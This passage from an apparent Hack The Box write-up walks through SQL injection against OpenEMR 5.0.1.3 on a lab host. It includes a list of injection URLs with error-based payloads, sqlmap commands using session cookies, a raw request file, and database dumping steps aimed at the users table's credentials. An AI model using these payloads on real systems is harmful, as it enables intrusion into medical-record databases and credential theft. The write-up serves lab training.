</span></span><span class=line><span class=cl><span class=n>it</span> <span class=n>looks</span> <span class=n>like</span> <span class=n>the</span> <span class=n>back</span><span class=o>-</span><span class=n>end</span> <span class=n>DBMS</span> <span class=n>is</span> <span class=s1>&#39;MySQL&#39;</span><span class=o>.</span> <span class=n>Do</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=n>skip</span> <span class=n>test</span> <span class=n>payloads</span> <span class=n>specific</span> <span class=k>for</span> <span class=n>other</span> <span class=n>DBMSes</span><span class=err>?</span> <span class=p>[</span><span class=n>Y</span><span class=o>/</span><span class=n>n</span><span class=p>]</span> <span class=n>y</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>the</span> <span class=n>remaining</span> <span class=n>tests</span><span class=p>,</span> <span class=k>do</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=n>include</span> <span class=n>all</span> <span class=n>tests</span> <span class=k>for</span> <span class=s1>&#39;MySQL&#39;</span> <span class=n>extending</span> <span class=n>provided</span> <span class=n>level</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=ow>and</span> <span class=n>risk</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=n>values</span><span class=err>?</span> <span class=p>[</span><span class=n>Y</span><span class=o>/</span><span class=n>n</span><span class=p>]</span> <span class=n>n</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>54</span><span class=p>:</span><span class=mi>32</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>testing</span> <span class=s1>&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>55</span><span class=p>:</span><span class=mi>29</span><span class=p>]</span> <span class=p>[</span><span class=n>WARNING</span><span class=p>]</span> <span class=n>there</span> <span class=n>is</span> <span class=n>a</span> <span class=n>possibility</span> <span class=n>that</span> <span class=n>the</span> <span class=n>target</span> <span class=p>(</span><span class=ow>or</span> <span class=n>WAF</span><span class=o>/</span><span class=n>IPS</span><span class=p>)</span> <span class=n>is</span> <span class=n>dropping</span> <span class=s1>&#39;suspicious&#39;</span> <span class=n>requests</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>55</span><span class=p>:</span><span class=mi>29</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>connection</span> <span class=n>timed</span> <span class=n>out</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span><span class=o>.</span> <span class=n>sqlmap</span> <span class=n>is</span> <span class=n>going</span> <span class=n>to</span> <span class=n>retry</span> <span class=n>the</span> <span class=n>request</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>56</span><span class=p>:</span><span class=mi>25</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>connection</span> <span class=n>timed</span> <span class=n>out</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span><span class=o>.</span> <span class=n>sqlmap</span> <span class=n>is</span> <span class=n>going</span> <span class=n>to</span> <span class=n>retry</span> <span class=n>the</span> <span class=n>request</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>57</span><span class=p>:</span><span class=mi>55</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>connection</span> <span class=n>timed</span> <span class=n>out</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>25</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>connection</span> <span class=n>timed</span> <span class=n>out</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span><span class=o>.</span> <span class=n>sqlmap</span> <span class=n>is</span> <span class=n>going</span> <span class=n>to</span> <span class=n>retry</span> <span class=n>the</span> <span class=n>request</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>21</span><span class=p>:</span><span class=mi>59</span><span class=p>:</span><span class=mi>55</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>connection</span> <span class=n>timed</span> <span class=n>out</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>22</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>25</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>connection</span> <span class=n>timed</span> <span class=n>out</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span><span class=o>.</span> <span class=n>sqlmap</span> <span class=n>is</span> <span class=n>going</span> <span class=n>to</span> <span class=n>retry</span> <span class=n>the</span> <span class=n>request</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>22</span><span class=p>:</span><span class=mi>01</span><span class=p>:</span><span class=mi>55</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>connection</span> <span class=n>timed</span> <span class=n>out</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>22</span><span class=p>:</span><span class=mi>02</span><span class=p>:</span><span class=mi>25</span><span class=p>]</span> <span class=p>[</span><span class=n>CRITICAL</span><span class=p>]</span> <span class=n>connection</span> <span class=n>timed</span> <span class=n>out</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span><span class=o>.</span> <span class=n>sqlmap</span> <span class=n>is</span> <span class=n>going</span> <span class=n>to</span> <span class=n>retry</span> <span class=n>the</span> <span class=n>request</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>there</span> <span class=n>seems</span> <span class=n>to</span> <span class=n>be</span> <span class=n>a</span> <span class=n>continuous</span> <span class=n>problem</span> <span class=n>with</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span><span class=o>.</span> <span class=n>Are</span> <span class=n>you</span> <span class=n>sure</span> <span class=n>that</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=k>continue</span><span class=err>?</span> <span class=p>[</span><span class=n>y</span><span class=o>/</span><span class=n>N</span><span class=p>]</span> <span class=n>N</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>22</span><span class=p>:</span><span class=mi>03</span><span class=p>:</span><span class=mi>36</span><span class=p>]</span> <span class=p>[</span><span class=n>ERROR</span><span class=p>]</span> <span class=n>user</span> <span class=n>quit</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>22</span><span class=p>:</span><span class=mi>03</span><span class=p>:</span><span class=mi>36</span><span class=p>]</span> <span class=p>[</span><span class=n>WARNING</span><span class=p>]</span> <span class=n>you</span> <span class=n>haven</span><span class=s1>&#39;t updated sqlmap for more than 84 days!!!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>ending</span> <span class=err>@</span> <span class=mi>22</span><span class=p>:</span><span class=mi>03</span><span class=p>:</span><span class=mi>36</span> <span class=o>/</span><span class=mi>2020</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>14</span><span class=o>/</span>
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s kinda working but pretty slow and unstable, so let&rsquo;s find another endpoint as it seems there
are many SQLi.</p><p>There is a document <a href=https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf>OpenEMR v5.0.1.3 - Vulnerability Report</a>
for exactly the same version as us. A dozen of SQLi are listed here.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>portal/find_appt_popup_user.php?catid=1&#39; AND (SELECT 0FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>interface/forms/eye_mag/php/Anything_simple.php?display=i&amp;encounter=1&#39; AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -&amp;category_name=POSTSEG
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>interface/forms_admin/forms_admin.php?id=32&#39; OR (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -&amp;method=enable
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>interface/de_identification_forms/find_code_popup.php?search_status=1&amp;search_term=&#39;)+or+updatexml(null,concat(0x0a,version()),null)--+-&amp;bn_search=Search
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>interface/de_identification_forms/find_immunization_popup.php?search_status=1&amp;search_term=&#39;)+or+updatexml(null,concat(0x0a,version()),null)--+-&amp;bn_search=Search
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>interface/de_identification_forms/find_code_popup.php?search_status=1&amp;search_term=&#39;)+or+updatexml(null,concat(0x0a,version()),null)--+-&amp;bn_search=Search
</span></span></code></pre></td></tr></table></div></div><p>The ones in 3.1 and 3.2 (portal) seems to give a SQL error while those from 3.3
to 3.9 seem to require authentication.</p><p>Those two request won&rsquo;t works because we need valid cookies even if the attack is unauthenticated.
Also we need to fill the registration form with random data even if we never receive the confirmation email, this will set a valid cookie.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sqlmap -u &#39;http://hms.htb/portal/add_edit_event_user.php?eid=1&#39; -p eid --random-agent --threads 10 --batch -b
</span></span><span class=line><span class=cl>$ sqlmap -u &#39;http://hms.htb/portal/find_appt_popup_user.php?catid=1&#39; -p catid --random-agent --threads 10 --batch -b
</span></span></code></pre></td></tr></table></div></div><p>So we have to add the <code>--cookie</code> option:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>sqlmap</span> <span class=o>-</span><span class=n>u</span> <span class=s1>&#39;http://hms.htb/portal/add_edit_event_user.php?eid=1&#39;</span> <span class=o>-</span><span class=n>p</span> <span class=n>eid</span> <span class=o>--</span><span class=n>cookie</span> <span class=s1>&#39;OpenEMR=jcn4a7ce07kbngbo7r9rolttgu; PHPSESSID=fcfeq8h77phga1bs6b1cshh64e&#39;</span> <span class=o>--</span><span class=n>random</span><span class=o>-</span><span class=n>agent</span> <span class=o>--</span><span class=n>threads</span> <span class=mi>10</span> <span class=o>--</span><span class=n>batch</span> <span class=o>-</span><span class=n>b</span>
</span></span><span class=line><span class=cl>        <span class=n>___</span>
</span></span><span class=line><span class=cl>       <span class=n>__H__</span>
</span></span><span class=line><span class=cl> <span class=n>___</span> <span class=n>___</span><span class=p>[</span><span class=o>.</span><span class=p>]</span><span class=n>_____</span> <span class=n>___</span> <span class=n>___</span>  <span class=p>{</span><span class=mf>1.4</span><span class=o>.</span><span class=mi>4</span><span class=c1>#stable}</span>
</span></span><span class=line><span class=cl><span class=o>|</span><span class=n>_</span> <span class=o>-|</span> <span class=o>.</span> <span class=p>[,]</span>     <span class=o>|</span> <span class=o>.</span><span class=s1>&#39;| . |</span>
</span></span><span class=line><span class=cl><span class=o>|</span><span class=n>___</span><span class=o>|</span><span class=n>_</span>  <span class=p>[)]</span><span class=n>_</span><span class=o>|</span><span class=n>_</span><span class=o>|</span><span class=n>_</span><span class=o>|</span><span class=n>__</span><span class=p>,</span><span class=o>|</span>  <span class=n>_</span><span class=o>|</span>
</span></span><span class=line><span class=cl>      <span class=o>|</span><span class=n>_</span><span class=o>|</span><span class=n>V</span><span class=o>...</span>       <span class=o>|</span><span class=n>_</span><span class=o>|</span>   <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>sqlmap</span><span class=o>.</span><span class=n>org</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=n>legal</span> <span class=n>disclaimer</span><span class=p>:</span> <span class=n>Usage</span> <span class=n>of</span> <span class=n>sqlmap</span> <span class=k>for</span> <span class=n>attacking</span> <span class=n>targets</span> <span class=n>without</span> <span class=n>prior</span> <span class=n>mutual</span> <span class=n>consent</span> <span class=n>is</span> <span class=n>illegal</span><span class=o>.</span> <span class=n>It</span> <span class=n>is</span> <span class=n>the</span> <span class=n>end</span> <span class=n>user</span><span class=s1>&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>starting</span> <span class=err>@</span> <span class=mi>23</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>23</span> <span class=o>/</span><span class=mi>2020</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>14</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>23</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>23</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>fetched</span> <span class=n>random</span> <span class=n>HTTP</span> <span class=n>User</span><span class=o>-</span><span class=n>Agent</span> <span class=n>header</span> <span class=n>value</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1&#39;</span> <span class=n>from</span> <span class=n>file</span> <span class=s1>&#39;/opt/sqlmap/data/txt/user-agents.txt&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>23</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>23</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>resuming</span> <span class=n>back</span><span class=o>-</span><span class=n>end</span> <span class=n>DBMS</span> <span class=s1>&#39;mysql&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>23</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>23</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>testing</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span> <span class=n>URL</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>23</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>23</span><span class=p>]</span> <span class=p>[</span><span class=n>WARNING</span><span class=p>]</span> <span class=n>there</span> <span class=n>is</span> <span class=n>a</span> <span class=n>DBMS</span> <span class=n>error</span> <span class=n>found</span> <span class=ow>in</span> <span class=n>the</span> <span class=n>HTTP</span> <span class=n>response</span> <span class=n>body</span> <span class=n>which</span> <span class=n>could</span> <span class=n>interfere</span> <span class=n>with</span> <span class=n>the</span> <span class=n>results</span> <span class=n>of</span> <span class=n>the</span> <span class=n>tests</span>
</span></span><span class=line><span class=cl><span class=n>sqlmap</span> <span class=n>resumed</span> <span class=n>the</span> <span class=n>following</span> <span class=n>injection</span> <span class=n>point</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>from</span> <span class=n>stored</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=o>---</span>
</span></span><span class=line><span class=cl><span class=n>Parameter</span><span class=p>:</span> <span class=n>eid</span> <span class=p>(</span><span class=n>GET</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Type</span><span class=p>:</span> <span class=n>boolean</span><span class=o>-</span><span class=n>based</span> <span class=n>blind</span>
</span></span><span class=line><span class=cl>    <span class=n>Title</span><span class=p>:</span> <span class=n>Boolean</span><span class=o>-</span><span class=n>based</span> <span class=n>blind</span> <span class=o>-</span> <span class=n>Parameter</span> <span class=n>replace</span> <span class=p>(</span><span class=n>original</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Payload</span><span class=p>:</span> <span class=n>eid</span><span class=o>=</span><span class=p>(</span><span class=n>SELECT</span> <span class=p>(</span><span class=n>CASE</span> <span class=n>WHEN</span> <span class=p>(</span><span class=mi>8435</span><span class=o>=</span><span class=mi>8435</span><span class=p>)</span> <span class=n>THEN</span> <span class=mi>1</span> <span class=n>ELSE</span> <span class=p>(</span><span class=n>SELECT</span> <span class=mi>1164</span> <span class=n>UNION</span> <span class=n>SELECT</span> <span class=mi>9741</span><span class=p>)</span> <span class=n>END</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Type</span><span class=p>:</span> <span class=n>error</span><span class=o>-</span><span class=n>based</span>
</span></span><span class=line><span class=cl>    <span class=n>Title</span><span class=p>:</span> <span class=n>MySQL</span> <span class=o>&gt;=</span> <span class=mf>5.1</span> <span class=n>AND</span> <span class=n>error</span><span class=o>-</span><span class=n>based</span> <span class=o>-</span> <span class=n>WHERE</span><span class=p>,</span> <span class=n>HAVING</span><span class=p>,</span> <span class=n>ORDER</span> <span class=n>BY</span> <span class=ow>or</span> <span class=n>GROUP</span> <span class=n>BY</span> <span class=n>clause</span> <span class=p>(</span><span class=n>EXTRACTVALUE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Payload</span><span class=p>:</span> <span class=n>eid</span><span class=o>=</span><span class=mi>1</span> <span class=n>AND</span> <span class=n>EXTRACTVALUE</span><span class=p>(</span><span class=mi>4452</span><span class=p>,</span><span class=n>CONCAT</span><span class=p>(</span><span class=mh>0x5c</span><span class=p>,</span><span class=mh>0x71787a7a71</span><span class=p>,(</span><span class=n>SELECT</span> <span class=p>(</span><span class=n>ELT</span><span class=p>(</span><span class=mi>4452</span><span class=o>=</span><span class=mi>4452</span><span class=p>,</span><span class=mi>1</span><span class=p>))),</span><span class=mh>0x717a716271</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Type</span><span class=p>:</span> <span class=n>time</span><span class=o>-</span><span class=n>based</span> <span class=n>blind</span>
</span></span><span class=line><span class=cl>    <span class=n>Title</span><span class=p>:</span> <span class=n>MySQL</span> <span class=o>&gt;=</span> <span class=mf>5.0</span><span class=o>.</span><span class=mi>12</span> <span class=n>AND</span> <span class=n>time</span><span class=o>-</span><span class=n>based</span> <span class=n>blind</span> <span class=p>(</span><span class=n>query</span> <span class=n>SLEEP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Payload</span><span class=p>:</span> <span class=n>eid</span><span class=o>=</span><span class=mi>1</span> <span class=n>AND</span> <span class=p>(</span><span class=n>SELECT</span> <span class=mi>5294</span> <span class=n>FROM</span> <span class=p>(</span><span class=n>SELECT</span><span class=p>(</span><span class=n>SLEEP</span><span class=p>(</span><span class=mi>5</span><span class=p>)))</span><span class=n>KKhg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Type</span><span class=p>:</span> <span class=n>UNION</span> <span class=n>query</span>
</span></span><span class=line><span class=cl>    <span class=n>Title</span><span class=p>:</span> <span class=n>Generic</span> <span class=n>UNION</span> <span class=n>query</span> <span class=p>(</span><span class=n>NULL</span><span class=p>)</span> <span class=o>-</span> <span class=mi>4</span> <span class=n>columns</span>
</span></span><span class=line><span class=cl>    <span class=n>Payload</span><span class=p>:</span> <span class=n>eid</span><span class=o>=</span><span class=mi>1</span> <span class=n>UNION</span> <span class=n>ALL</span> <span class=n>SELECT</span> <span class=n>NULL</span><span class=p>,</span><span class=n>NULL</span><span class=p>,</span><span class=n>CONCAT</span><span class=p>(</span><span class=mh>0x71787a7a71</span><span class=p>,</span><span class=mh>0x73535a4b567775646f4d7849526d4b6d4a697572466f44734446724d5072526b7079474c6a616242</span><span class=p>,</span><span class=mh>0x717a716271</span><span class=p>),</span><span class=n>NULL</span><span class=o>--</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=o>---</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>23</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>23</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>the</span> <span class=n>back</span><span class=o>-</span><span class=n>end</span> <span class=n>DBMS</span> <span class=n>is</span> <span class=n>MySQL</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>23</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>23</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>fetching</span> <span class=n>banner</span>
</span></span><span class=line><span class=cl><span class=n>back</span><span class=o>-</span><span class=n>end</span> <span class=n>DBMS</span> <span class=n>operating</span> <span class=n>system</span><span class=p>:</span> <span class=n>Linux</span> <span class=n>Ubuntu</span>
</span></span><span class=line><span class=cl><span class=n>back</span><span class=o>-</span><span class=n>end</span> <span class=n>DBMS</span><span class=p>:</span> <span class=n>MySQL</span> <span class=o>&gt;=</span> <span class=mf>5.1</span>
</span></span><span class=line><span class=cl><span class=n>banner</span><span class=p>:</span> <span class=s1>&#39;5.7.30-0ubuntu0.18.04.1&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>23</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>23</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>fetched</span> <span class=n>data</span> <span class=n>logged</span> <span class=n>to</span> <span class=n>text</span> <span class=n>files</span> <span class=n>under</span> <span class=s1>&#39;/home/cyfun/.sqlmap/output/hms.htb&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>23</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>23</span><span class=p>]</span> <span class=p>[</span><span class=n>WARNING</span><span class=p>]</span> <span class=n>you</span> <span class=n>haven</span><span class=s1>&#39;t updated sqlmap for more than 84 days!!!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>ending</span> <span class=err>@</span> <span class=mi>23</span><span class=p>:</span><span class=mi>28</span><span class=p>:</span><span class=mi>23</span> <span class=o>/</span><span class=mi>2020</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>14</span><span class=o>/</span>
</span></span></code></pre></td></tr></table></div></div><p>Alternatively you can store the raw HTTP request in a file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
</span></span><span class=line><span class=cl>Host: hms.htb
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Connection: keep-alive
</span></span><span class=line><span class=cl>Cookie: OpenEMR=jcn4a7ce07kbngbo7r9rolttgu; PHPSESSID=fcfeq8h77phga1bs6b1cshh64e
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span></code></pre></td></tr></table></div></div><p>And then tell sqlmap to use this req file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sqlmap -r &#34;$(pwd)/sqli.req&#34; --random-agent --threads 10 --batch -b
</span></span></code></pre></td></tr></table></div></div><p>Now let&rsquo;s use sqlmap dump options.</p><p><code>--dbs</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>available databases [2]:
</span></span><span class=line><span class=cl>[*] information_schema
</span></span><span class=line><span class=cl>[*] openemr
</span></span></code></pre></td></tr></table></div></div><p><code>-D openemr --tables</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Database: openemr
</span></span><span class=line><span class=cl>[234 tables]
</span></span><span class=line><span class=cl>+---------------------------------------+
</span></span><span class=line><span class=cl>| array                                 |
</span></span><span class=line><span class=cl>| groups                                |
</span></span><span class=line><span class=cl>| sequences                             |
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>| user_settings                         |
</span></span><span class=line><span class=cl>| users                                 |
</span></span><span class=line><span class=cl>| users_facility                        |
</span></span><span class=line><span class=cl>| users_secure                          |
</span></span><span class=line><span class=cl>| valueset                              |
</span></span><span class=line><span class=cl>| voids                                 |
</span></span><span class=line><span class=cl>| x12_partners                          |
</span></span><span class=line><span class=cl>+---------------------------------------+
</span></span></code></pre></td></tr></table></div></div><p><code>-D openemr -T users --columns</code></p><p><code>-D openemr -T users -C username,password --dump</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Database: openemr
</span></span><span class=line><span class=cl>Table: users
</span></span><span class=line><span class=cl>[3 entries]
</span></span><span class=line><span class=cl>+-----------------+--------------+
</span></span><span class=line><span class=cl>| username        | password     |
</span></span><span class=line><span class=cl>+-----------------+--------------+
